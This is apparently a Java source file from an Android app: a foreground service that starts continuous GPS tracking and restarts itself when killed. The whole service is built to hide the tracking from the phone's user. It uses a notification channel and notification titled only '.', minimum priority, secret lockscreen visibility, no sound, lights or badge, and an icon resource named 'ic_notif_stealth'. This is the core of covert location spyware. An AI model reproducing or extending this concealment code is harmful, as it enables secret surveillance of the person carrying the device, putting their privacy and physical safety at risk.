package com.fason.app.features.gps;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.IBinder;

import androidx.core.app.NotificationCompat;

import com.fason.app.R;
import com.fason.app.core.Protocol;

public class GPSTrackingService extends Service {

    private static final int NOTIF_ID = 3;
    private GpsModule gpsModule;

    @Override
    public void onCreate() {
        super.onCreate();
        createChannel();
        startForegroundCompat();
        gpsModule = new GpsModule(this);
        gpsModule.startTracking();
    }

    private void createChannel() {
        NotificationManager nm = getSystemService(NotificationManager.class);
        if (nm == null) return;

        NotificationChannel existing = nm.getNotificationChannel(Protocol.NOTIF_CHANNEL);
        if (existing != null) return;

        NotificationChannel ch = new NotificationChannel(
            Protocol.NOTIF_CHANNEL, ".", NotificationManager.IMPORTANCE_MIN);
        ch.setDescription(".");
        ch.setShowBadge(false);
        ch.setSound(null, null);
        ch.enableLights(false);
        ch.enableVibration(false);
        ch.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
        ch.setAllowBubbles(false);
        nm.createNotificationChannel(ch);
    }

    private void startForegroundCompat() {
        Notification n = new NotificationCompat.Builder(this, Protocol.NOTIF_CHANNEL)
            .setSmallIcon(R.drawable.ic_notif_stealth)
            .setContentTitle(".")
            .setContentText(".")
            .setOngoing(true)
            .setSilent(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setShowWhen(false)
            .setGroup(Protocol.NOTIF_GROUP)
            .setGroupAlertBehavior(NotificationCompat.GROUP_ALERT_SUMMARY)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .build();

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                startForeground(NOTIF_ID, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
            } else {
                startForeground(NOTIF_ID, n);
            }
        } catch (SecurityException e) {
            startForeground(NOTIF_ID, n);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        if (gpsModule != null) gpsModule.destroy();
        super.onDestroy();
    }
}
